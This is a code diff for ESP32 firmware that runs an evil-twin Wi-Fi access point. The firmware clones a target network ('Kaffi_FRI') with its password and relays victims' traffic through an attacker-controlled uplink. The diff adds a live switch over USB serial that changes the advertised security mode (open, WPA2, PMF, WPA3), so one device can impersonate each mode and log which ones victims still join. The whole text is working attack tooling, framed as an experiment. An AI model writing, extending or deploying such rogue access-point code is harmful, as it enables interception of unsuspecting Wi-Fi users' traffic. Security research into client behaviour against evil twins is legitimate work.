@@ -10,6 +10,11 @@ static const char *TAG = "wifi_twin";
 static esp_netif_t *s_ap_netif;
 static esp_netif_t *s_sta_netif;
 
+// Advertised security mode (the WPA2 vs PMF vs WPA3 experiment). Switchable live
+// over USB serial; defaults to the classic WPA2-PSK twin.
+static wifi_auth_mode_t s_authmode     = WIFI_AUTH_WPA2_PSK;
+static bool             s_pmf_required = false;
+
 // Persistent storage for the vendor IE: esp_wifi_set_vendor_ie keeps a pointer,
 // so this buffer must outlive the call.
 static uint8_t s_vie_buf[sizeof(vendor_ie_data_t) + DISGUISE_VENDOR_PAYLOAD_MAX];
@@ -34,10 +39,12 @@ esp_err_t wifi_twin_init(void)
 // called while WiFi is stopped (esp_wifi_set_mac requires it).
 static esp_err_t configure(const disguise_t *d)
 {
-    // ---- STA (uplink to the REAL router, so the relay has internet) ----
+    // ---- STA (uplink to the attacker backhaul, so the relay has internet) ----
+    // Uplink is the laptop gateway (ALGHUL_UPLINK_SSID), deliberately a DIFFERENT
+    // network from the advertised clone, so the victim never sees two "Kaffi_FRI".
     wifi_config_t sta = {0};
-    strlcpy((char *)sta.sta.ssid,     ALGHUL_TARGET_SSID, sizeof(sta.sta.ssid));
-    strlcpy((char *)sta.sta.password, ALGHUL_TARGET_PSK,  sizeof(sta.sta.password));
+    strlcpy((char *)sta.sta.ssid,     ALGHUL_UPLINK_SSID, sizeof(sta.sta.ssid));
+    strlcpy((char *)sta.sta.password, ALGHUL_UPLINK_PSK,  sizeof(sta.sta.password));
     static const uint8_t up_bssid[6] = ALGHUL_UPLINK_BSSID;
     bool lock = false;
     for (int i = 0; i < 6; i++) if (up_bssid[i]) lock = true;
@@ -55,11 +62,22 @@ static esp_err_t configure(const disguise_t *d)
     ap.ap.channel        = 1;  // the stack moves the AP to the STA channel on connect
     ap.ap.max_connection = ALGHUL_AP_MAX_CONN;
     ap.ap.beacon_interval = d->beacon_interval;
-    if (strlen(ALGHUL_TARGET_PSK) > 0) {
-        strlcpy((char *)ap.ap.password, ALGHUL_TARGET_PSK, sizeof(ap.ap.password));
-        ap.ap.authmode = WIFI_AUTH_WPA2_PSK;
-    } else {
+    // ---- advertised security mode (the WPA2 / PMF / WPA3 experiment) --------
+    // s_authmode is switchable at runtime over USB serial, so ONE firmware can
+    // impersonate every personal mode and we measure which a victim still joins.
+    // OPEN carries no password; every other mode reuses the cloned PSK.
+    if (s_authmode == WIFI_AUTH_OPEN) {
         ap.ap.authmode = WIFI_AUTH_OPEN;
+    } else {
+        strlcpy((char *)ap.ap.password, ALGHUL_TARGET_PSK, sizeof(ap.ap.password));
+        ap.ap.authmode = s_authmode;
+    }
+    // PMF: always advertise capable; "required" is our knob for the WPA2+PMF
+    // case. For WPA3 and transition the stack forces PMF on regardless.
+    ap.ap.pmf_cfg.capable  = true;
+    ap.ap.pmf_cfg.required = s_pmf_required;
+    if (s_authmode == WIFI_AUTH_WPA3_PSK || s_authmode == WIFI_AUTH_WPA2_WPA3_PSK) {
+        ap.ap.sae_pwe_h2e = WPA3_SAE_PWE_BOTH;  // accept H2E and hunt-and-peck clients
     }
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap));
 
@@ -133,5 +151,32 @@ esp_err_t wifi_twin_apply_disguise(const disguise_t *d)
         esp_wifi_set_config(WIFI_IF_AP, &ap);
         apply_runtime(d);  // tx power + vendor IE, both live
     }
+    return ESP_OK;
+}
+
+const char *wifi_twin_authmode_name(void)
+{
+    switch (s_authmode) {
+    case WIFI_AUTH_OPEN:          return "OPEN";
+    case WIFI_AUTH_WPA2_PSK:      return s_pmf_required ? "WPA2-PSK+PMF" : "WPA2-PSK";
+    case WIFI_AUTH_WPA3_PSK:      return "WPA3-SAE";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3-transition";
+    default:                      return "other";
+    }
+}
+
+esp_err_t wifi_twin_set_authmode(wifi_auth_mode_t mode, bool pmf_required)
+{
+    s_authmode     = mode;
+    s_pmf_required = pmf_required;
+    // The advertised auth mode can only change while the AP is stopped, so this
+    // is a brief AP/STA restart (like a BSSID change). USB serial survives it,
+    // which is why the switch command comes over serial and not HTTP.
+    ESP_LOGI(TAG, "switching advertised security -> %s (brief restart)",
+             wifi_twin_authmode_name());
+    ESP_ERROR_CHECK(esp_wifi_stop());
+    ESP_ERROR_CHECK(configure(disguise_current()));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    apply_runtime(disguise_current());
     return ESP_OK;
 }
